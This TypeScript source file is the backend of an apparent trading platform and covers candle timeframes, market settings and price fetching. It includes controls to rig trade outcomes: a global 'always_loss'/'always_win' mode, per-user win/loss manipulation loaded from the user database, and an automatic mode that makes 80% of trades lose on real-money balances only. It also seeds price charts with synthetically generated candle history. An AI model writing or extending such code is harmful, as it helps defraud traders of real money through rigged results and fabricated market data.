import axios from 'axios';
import { markets, Market } from '../markets.ts';
import db, { query, get, run } from '../db/mysql-db.ts';
import { adminDb } from '../lib/firebase-admin.ts';
import { generateSingleCandleOHLC, generateHistoricalCandleSeries } from './candlestickEngine.ts';
import { aggregateCandlesToTimeframe } from './timeframeAggregationEngine.ts';

export const markets_real = JSON.parse(JSON.stringify(markets));
export const markets_demo = markets_real;

export async function loadMarketSettings() {
  const marketSettings = await query('SELECT * FROM market_settings');
  if (marketSettings && Array.isArray(marketSettings)) {
    for (const row of marketSettings) {
      if (markets_real[row.pair]) {
        markets_real[row.pair].hidden = !!row.hidden;
        if (row.payout !== undefined && row.payout !== null) {
          markets_real[row.pair].payout = row.payout;
        }
      }
    }
  }
}

export const history_real: Record<string, Record<string, any[]>> = {};
export const history_demo = history_real;

export const currentCandles_real: Record<string, Record<string, any>> = {};
export const currentCandles_demo = currentCandles_real;

export const TIMEFRAMES = [
  "5 seconds",
  "10 seconds",
  "15 seconds",
  "30 seconds",
  "1 minute",
  "5 minutes",
  "10 minutes",
  "15 minutes",
  "30 minutes",
  "1 hour",
  "3 hours",
  "12 hours",
  "1 day"
];

export const timeframeSecondsMap: Record<string, number> = {
  "5 seconds": 5,
  "10 seconds": 10,
  "15 seconds": 15,
  "30 seconds": 30,
  "1 minute": 60,
  "5 minutes": 300,
  "10 minutes": 600,
  "15 minutes": 900,
  "30 minutes": 1800,
  "1 hour": 3600,
  "3 hours": 10800,
  "12 hours": 43200,
  "1 day": 86400
};

export function saveCandleToDB(pair: string, type: 'real' | 'demo', candle: any) {
  // Backwards compatibility wrapper for the old 5s format
  saveCandleToDB_v2(pair, type, "5 seconds", {
    open: candle.open,
    high: candle.high,
    low: candle.low,
    close: candle.close,
    volume: candle.volume,
    openTime: candle.time,
    closeTime: candle.time + 5
  });
}

const lastSqliteWrite = new Map<string, number>();

let insertCandleStmt: any = null;
const candleBuffer: any[] = [];
let isFlushing = false;

// Background task to flush the candle buffer using a high-performance transaction
async function flushCandleBuffer() {
  if (isFlushing || candleBuffer.length === 0) return;
  isFlushing = true;
  
  try {
    if (!insertCandleStmt) {
      insertCandleStmt = db.prepare(`
        INSERT INTO historical_candles (market, type, timeframe, open, high, low, close, volume, openTime, closeTime)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ON CONFLICT(market, type, timeframe, openTime) DO UPDATE SET
          high = excluded.high,
          low = excluded.low,
          close = excluded.close,
          volume = excluded.volume,
          closeTime = excluded.closeTime
      `);
    }

    const batch = candleBuffer.splice(0, 1000);
    for (const r of batch) {
      insertCandleStmt.run(
        r.pair,
        r.type,
        r.timeframe,
        r.open,
        r.high,
        r.low,
        r.close,
        r.volume,
        r.openTime,
        r.closeTime
      );
    }
  } catch (err) {
    console.error('Failed to flush candle buffer:', err);
  } finally {
    isFlushing = false;
    if (candleBuffer.length > 0) {
      setImmediate(flushCandleBuffer);
    }
  }
}

// Background tasks for database flushing and pruning are disabled to maximize performance and prevent blocking.

export function saveCandleToDB_v2(pair: string, type: 'real' | 'demo', timeframe: string, candle: any) {
  try {
    // PERSISTENCE DISABLED as per user request to prevent database blocking/freezing.
    // We only maintain in-memory state now for real-time charting.
    return;
  } catch (err: any) {
    console.error(`Failed to save historical candle to DB for ${pair} (${type}) timeframe ${timeframe}:`, err.message);
  }
}

function resampleCandles(baseCandles: any[], tfSeconds: number): any[] {
  if (baseCandles.length === 0) return [];
  const resampled: any[] = [];
  let currentCandle: any = null;
  let currentBucket = null;
  
  for (const d of baseCandles) {
    const bucketTime = d.openTime - (d.openTime % tfSeconds);
    if (!currentCandle || currentBucket !== bucketTime) {
      if (currentCandle) {
        resampled.push(currentCandle);
      }
      currentBucket = bucketTime;
      currentCandle = {
        open: d.open,
        high: d.high,
        low: d.low,
        close: d.close,
        volume: d.volume,
        openTime: bucketTime,
        closeTime: bucketTime + tfSeconds
      };
    } else {
      currentCandle.high = Math.max(currentCandle.high, d.high);
      currentCandle.low = Math.min(currentCandle.low, d.low);
      currentCandle.close = d.close;
      currentCandle.volume += d.volume;
    }
  }
  if (currentCandle) {
    resampled.push(currentCandle);
  }
  return resampled;
}

export function isMarketClosedAt(pair: string, timestampSec: number): boolean {
  const isOTC = pair.includes('(OTC)') || pair.includes('Crypto IDX');
  if (isOTC) {
    return false;
  }

  const isCrypto = pair.includes('/USD') && !(
    pair.startsWith('EUR/') || pair.startsWith('GBP/') || pair.startsWith('AUD/') || 
    pair.startsWith('NZD/') || pair.startsWith('USD/') || pair.startsWith('CAD/') || 
    pair.startsWith('CHF/') || pair.startsWith('JPY/') || pair.startsWith('DKK/') || 
    pair.startsWith('SEK/') || pair.startsWith('NOK/') || pair.startsWith('PLN/') || 
    pair.startsWith('HUF/') || pair.startsWith('CZK/') || pair.startsWith('ILS/') || 
    pair.startsWith('THB/') || pair.startsWith('TRY/') || pair.startsWith('SGD/')
  );

  if (isCrypto) {
    return false;
  }

  const date = new Date(timestampSec * 1000);
  const day = date.getUTCDay(); // 0 = Sunday, 6 = Saturday
  const hours = date.getUTCHours();

  // Weekend closed hours: Friday 21:00 UTC to Sunday 22:00 UTC
  if (day === 6) {
    return true; // Saturday is always closed
  }
  if (day === 5 && hours >= 21) {
    return true; // Friday after 21:00 UTC is closed
  }
  if (day === 0 && hours < 22) {
    return true; // Sunday before 22:00 UTC is closed
  }

  // Specific Stock hours (e.g., Yum Brands): 13:30 to 20:00 UTC Mon-Fri
  if (pair === 'Yum Brands') {
    if (hours < 13 || hours >= 20) {
      return true;
    }
  }

  return false;
}

// Pruning logic is handled in-memory for the current session.
export async function pruneHistoricalCandles() {
  return;
}

export async function initializeCandlesFromDB() {
  console.log('📦 Initializing candle storage in-memory...');
  
  // Load persistent market settings (like hidden/visible states) from DB
  loadMarketSettings().then(() => {
    console.log('✅ Loaded persistent market settings from database.');
  }).catch(err => {
    console.warn('Database not ready for market settings, using defaults.');
  });
  
  const pairKeys = Object.keys(markets);
  const now = Math.floor(Date.now() / 1000);

  // Fast non-blocking initialization for each pair and type
  for (const pair of pairKeys) {
    for (const type of ['real', 'demo']) {
      // Yield every pair to keep event loop responsive
      await new Promise(resolve => setImmediate(resolve));
      
      try {
        const basePrice = markets[pair]?.price || 100;
        
        // Load active candles and history for all 13 supported timeframes
        // Ensures smooth, continuous candles with zero gaps on pair and timeframe switching
        let decimals = 5;
        if (pair.includes('SHIB') || pair.includes('PEPE') || pair.includes('BONK') || pair.includes('RSR') || pair.includes('FLOKI')) {
          decimals = 8;
        } else if (pair.includes('Crypto IDX') || pair.includes('BTC/') || pair.includes('ETH/') || pair.includes('US 30') || pair.includes('JPN 225')) {
          decimals = 2;
        } else if (pair.includes('/JPY')) {
          decimals = 3;
        } else if (pair.includes('Gold') || pair.includes('Oil') || pair.includes('Apple') || pair.includes('Tesla')) {
          decimals = 2;
        }

        // Generate base 5s series first
        const baseBucket5s = now - (now % 5);
        const base5sRows = generateHistoricalCandleSeries({
          asset: pair,
          endClose: basePrice,
          endTime: baseBucket5s - 5,
          count: 1200,
          tfSeconds: 5,
          decimals: decimals
        });

        for (const tf of TIMEFRAMES) {
          const tfSeconds = timeframeSecondsMap[tf] || 60;
          const bucketTime = now - (now % tfSeconds);

          let seedRows: any[] = [];
          if (tf === "5 seconds") {
            seedRows = base5sRows;
          } else if (tfSeconds <= 300) {
            // Aggregate from base 5s series
            seedRows = aggregateCandlesToTimeframe(base5sRows, tfSeconds, decimals);
            if (seedRows.length < 150) {
              const extra = generateHistoricalCandleSeries({
                asset: pair,
                endClose: seedRows.length > 0 ? seedRows[0].open : basePrice,
                endTime: (seedRows.length > 0 ? seedRows[0].openTime : bucketTime) - tfSeconds,
                count: 150 - seedRows.length,
                tfSeconds: tfSeconds,
                decimals: decimals
              });
              seedRows = [...extra, ...seedRows];
            }
          } else {
            // For macro timeframes (10m, 15m, 30m, 1h, 3h, 12h, 1d)
            seedRows = generateHistoricalCandleSeries({
              asset: pair,
              endClose: basePrice,
              endTime: bucketTime - tfSeconds,
              count: 200,
              tfSeconds: tfSeconds,
              decimals: decimals
            });
          }

          if (type === 'real') {
            if (!history_real[pair]) history_real[pair] = {};
            history_real[pair][tf] = seedRows;
          } else {
            if (!history_demo[pair]) history_demo[pair] = {};
            history_demo[pair][tf] = seedRows;
          }

          const currentCandles = type === 'real' ? currentCandles_real : currentCandles_demo;
          if (!currentCandles[pair]) currentCandles[pair] = {};
          
          const lastCompletedClose = seedRows.length > 0 ? seedRows[seedRows.length - 1].close : basePrice;
          currentCandles[pair][tf] = {
            open: lastCompletedClose,
            high: Math.max(lastCompletedClose, basePrice),
            low: Math.min(lastCompletedClose, basePrice),
            close: basePrice,
            volume: 10,
            openTime: bucketTime,
            closeTime: bucketTime + tfSeconds
          };

          if (tf === '5 seconds' && type === 'real') {
            markets_real[pair].price = basePrice;
          } else if (tf === '5 seconds' && type === 'demo') {
            markets_demo[pair].price = basePrice;
          }
        }
      } catch (err: any) {
        console.error(`Error loading candles for ${pair}:`, err.message);
      }
    }
  }
  console.log('✅ Candle storage initialized successfully!');
}

export let globalManipulationMode: 'neutral' | 'always_loss' | 'always_win' = 'neutral';
export let systemActive = true;

export const userManipulationCache = new Map<string, 'neutral' | 'loss' | 'win'>();
export const setUserManipulation = (userId: string, mode: 'neutral' | 'loss' | 'win') => {
  if (mode === 'neutral') userManipulationCache.delete(userId);
  else userManipulationCache.set(userId, mode);
};

export async function initializeUserManipulation() {
  try {
    const users = await query('SELECT uid, manipulation_mode FROM users WHERE manipulation_mode != ?', ['neutral']) as any[];
    for (const u of users) {
      setUserManipulation(u.uid.toString(), u.manipulation_mode);
    }
    console.log(`📦 Initialized user manipulation for ${users.length} users`);
  } catch (err) {
    console.error('Failed to initialize user manipulation cache:', err);
  }
}

const firestoreCandleBuffer: any[] = [];
let isFlushingFirestore = false;

// Firestore Persistence for candles (Master Store)
export async function saveCandleToFirestore(pair: string, type: string, timeframe: string, candle: any) {
  // Firestore persistence disabled as per user request.
  return;
}

async function flushFirestoreCandleBuffer() {
  if (isFlushingFirestore || firestoreCandleBuffer.length === 0) return;
  isFlushingFirestore = true;
  
  try {
    const batchList = firestoreCandleBuffer.splice(0, 450);
    const batch = adminDb.batch();
    for (const item of batchList) {
      const { pair, type, timeframe, candle } = item;
      const docId = `${pair}_${type}_${timeframe}_${candle.openTime}`;
      const ref = adminDb.collection('market_candles').doc(docId);
      batch.set(ref, {
        pair,
        type,
        timeframe,
        open: Number(candle.open),
        high: Number(candle.high),
        low: Number(candle.low),
        close: Number(candle.close),
        volume: Number(candle.volume),
        openTime: Number(candle.openTime),
        closeTime: Number(candle.closeTime),
        updatedAt: Date.now()
      }, { merge: true });
    }
    await batch.commit();
  } catch (e: any) {
    console.error('Failed to commit firestore candle batch:', e.message);
  } finally {
    isFlushingFirestore = false;
    if (firestoreCandleBuffer.length > 0) {
      setTimeout(flushFirestoreCandleBuffer, 100);
    }
  }
}

// setInterval(flushFirestoreCandleBuffer, 5000);

export function setSystemActive(active: boolean) {
  systemActive = active;
}

export function setGlobalManipulationMode(mode: 'neutral' | 'always_loss' | 'always_win') {
  globalManipulationMode = mode;
}

export interface AutoMarketConfig {
  enabled: boolean;
  lossRate: number; // default 80%
  winRate: number;  // default 20%
  maxConcurrentTrades: number; // default 10
  realOnly: boolean; // strictly true: Live/Real balance only
}

export let autoMarketConfig: AutoMarketConfig = {
  enabled: false,
  lossRate: 80,
  winRate: 20,
  maxConcurrentTrades: 100,
  realOnly: true
};

export async function loadAutoMarketConfig() {
  try {
    const row = await get('SELECT value FROM app_settings WHERE key = ?', ['auto_market_config']) as any;
    if (row && row.value) {
      const parsed = JSON.parse(row.value);
      autoMarketConfig = { ...autoMarketConfig, ...parsed, realOnly: true };
      console.log('🤖 Loaded Auto Market Config from DB:', autoMarketConfig);
    } else {
      const now = Date.now();
      await run(
        'INSERT INTO app_settings (key, value, updated_at, created_at) VALUES (?, ?, ?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at',
        ['auto_market_config', JSON.stringify(autoMarketConfig), now, now]
      );
      console.log('🤖 Initialized default Auto Market Config:', autoMarketConfig);
    }
  } catch (err: any) {
    console.warn('Could not load auto_market_config from DB, using memory default:', err.message);
  }
}

export async function updateAutoMarketConfig(newConfig: Partial<AutoMarketConfig>) {
  autoMarketConfig = { ...autoMarketConfig, ...newConfig, realOnly: true };
  try {
    const now = Date.now();
    await run(
      'INSERT INTO app_settings (key, value, updated_at, created_at) VALUES (?, ?, ?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at',
      ['auto_market_config', JSON.stringify(autoMarketConfig), now, now]
    );
  } catch (err: any) {
    console.error('Failed to save auto_market_config to DB:', err.message);
  }
  return autoMarketConfig;
}

const priceCache: Record<string, { price: number; lastFetched: number; invalid: boolean }> = {};

export function getFMPSymbol(pair: string) {
    if (pair.includes('BTC/USD')) return 'BTCUSD';
    if (pair.includes('ETH/USD')) return 'ETHUSD';
    if (pair.includes('SOL/USD')) return 'SOLUSD';
    if (pair.includes('Crypto IDX')) return 'BTCUSD';
    return pair.replace('/', '').replace(' (OTC)', '').replace(/\s+/g, '');
}

export async function fetchAllRealPrices() {
  const pairKeys = Object.keys(markets);
  const apiKey = process.env.VITE_FMP_API_KEY || 'demo'; // Use demo if no key provided
  
  // Group symbols for batch fetching to save API calls
  const symbolsToFetch: string[] = [];
  for (const pair of pairKeys) {
    const isOTC = pair.includes('(OTC)') || pair.includes('Crypto IDX') || pair.includes('IDX');
    const isCrypto = pair.includes('/USD') && !pair.includes('EUR/') && !pair.includes('GBP/');
    
    // Crypto is already handled by LiveApiService (Binance WebSocket)
    if (!isOTC && !isCrypto) {
      symbolsToFetch.push(getFMPSymbol(pair));
    }
  }

  if (symbolsToFetch.length === 0) return;

  try {
    const batchSize = 40;
    for (let i = 0; i < symbolsToFetch.length; i += batchSize) {
      const batch = symbolsToFetch.slice(i, i + batchSize).join(',');
      const url = `https://financialmodelingprep.com/api/v3/quote-short/${batch}?apikey=${apiKey}`;
      
      const response = await fetch(url);
      if (!response.ok) continue;
      
      const data = await response.json();
      if (Array.isArray(data)) {
        for (const quote of data) {
          const symbol = quote.symbol;
          const price = parseFloat(quote.price);
          
          // Find which pair this symbol belongs to
          for (const pair of pairKeys) {
            if (getFMPSymbol(pair) === symbol) {
              if (markets_real[pair] && !isNaN(price) && price > 0) {
                const current = Number(markets_real[pair].price || 0);
                const isFirstLoad = !current || current <= 0 || (Math.abs(price - current) / current) > 0.015;
                markets_real[pair].targetPrice = price;
                if (isFirstLoad) {
                  markets_real[pair].price = price;
                }
              }
            }
          }
        }
      }
    }
  } catch (err: any) {
    // console.error('Failed to fetch real market prices:', err.message);
  }
}
